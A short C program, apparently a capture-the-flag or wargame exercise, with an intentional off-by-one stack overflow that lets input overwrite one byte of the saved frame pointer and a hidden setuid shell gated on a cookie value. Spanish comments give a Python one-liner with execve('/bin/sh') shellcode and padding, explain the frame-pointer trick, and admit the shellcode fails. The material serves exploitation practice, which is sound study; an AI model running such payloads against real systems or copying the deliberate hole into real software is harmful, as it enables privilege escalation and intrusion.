#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int limit, c;
int getebp() { __asm__("movl %ebp, %eax"); }

void f(char *s){
	printf("%s",s);
	int *i;
	char buf[256];
	i = (int *) getebp();
	limit = *i - (int)buf + 1;
	for (c=0; c<limit && s[c] != '\0'; c++)
		buf[c] = s[c];
}
void no_need(char *s){
	f(s);
}
int main(int argc, char **argv){
	int cookie = 1000;
	no_need(argv[1]);
	if(cookie == 0xdefaced){
		setresuid(geteuid(), geteuid(), geteuid());
		execlp("/bin/sh", "/bin/sh", "-i", NULL);
	}
	return 0;
}

//run `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*(268-23) +"\x2c"'`
//En este caso solo podemos modificar un byte del EBP, así que buscamos una dirección que apunte a la shellcode y modificamos el EBP para que apunte 4bytes menos de esa dirección. De esta forma directamente saltamos a la shellcode
//Como dentro del stack ya hay un sitio que apunta directamente a la shellcode, dentro de nuestro exploit no tenemos que guardar la dirección de la shellcode sino que apuntamos directamente a esa dirección -4bytes
//Por elgun motivo la shellcode muere
